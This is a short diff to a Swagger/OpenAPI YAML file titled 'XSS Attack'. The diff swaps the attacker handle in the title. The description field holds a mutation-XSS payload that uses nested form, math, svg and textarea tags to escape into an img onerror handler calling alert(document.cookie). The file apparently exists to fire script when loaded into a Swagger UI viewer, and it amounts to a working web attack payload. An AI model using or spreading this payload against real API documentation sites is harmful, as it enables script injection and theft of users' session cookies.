@@ -1,6 +1,6 @@
 swagger: '2.0'
 info:
-  title: XSS Attack BY LUTHRAX-H1
+  title: XSS Attack BY Cryptographer-H1
   description: |
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
   version: production
